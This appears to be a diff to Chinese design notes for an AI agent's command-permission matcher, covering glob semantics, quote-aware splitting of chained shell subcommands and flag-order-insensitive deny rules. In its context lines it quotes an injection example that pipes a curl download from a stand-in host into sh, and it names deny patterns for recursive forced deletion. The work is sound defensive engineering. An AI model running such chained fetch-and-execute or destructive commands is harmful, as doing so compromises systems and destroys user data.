@@ -91,6 +91,10 @@ permissions:
 
 `globMatch` 的语义：`*` 是唯一通配符，匹配任意字符序列**包括 `/`**（所以不需要 `**` 特例）；大小写敏感；实现是迭代式星号回溯，不编译正则。`exec:git *` 命中 `git diff`、`git status`，也命中 `git diff; curl evil | sh`（见"边界"）。
 
+**exec 的接续符拆分是引号感知的**（`splitSubcommands`）：`;`/`|`/`&&`/换行在单引号内完全惰性、在双引号内不再拆分（`echo "a;b"` 是一段）；命令替换开拢符 `$( ` 与反引号在双引号内**仍然拆**——shell 在双引号里也会执行它们。有歧义的角落一律过拆不过漏拆：deny 会扫到每一段，allow/会话授权则照旧"跨拼接不生效"。聚合短旗标在 token 层展开（`-rf` → `-r -f`；仅纯字母主体，`-d,`/`--force` 保持整体）。
+
+**deny 的双路匹配**（`#execDenyHit`）：legacy 字符串 glob（所有既有规则的行为逐字节保留）**或** token 集合覆盖（`denyTokenCover`）任一命中即黑名单——token 路径把旗标换序盲区补上：`exec:rm -rf*` 同样拦下 `rm -r -f x` 与 `rm -f -r /bin/x`（头部 basename 相等/前缀 + 规则旗标 token 逐个在命令 token 多重集里找得到，顺序无关）。**token 路径是 deny 专属**——它只会扩大匹配面，用在 allow/沉淀规则/会话授权上就是把用户没批过的命令形态自动放行（fail-open），所以放行侧永远只走 legacy 字符串匹配（旗标换序的命令会再确认一次，这是有意的保守）。
+
 `extractArg` 决定规则比对哪段字符串，按工具的**待遇派生**（见下节）取：
 
 | 工具待遇 | 匹配对象 |
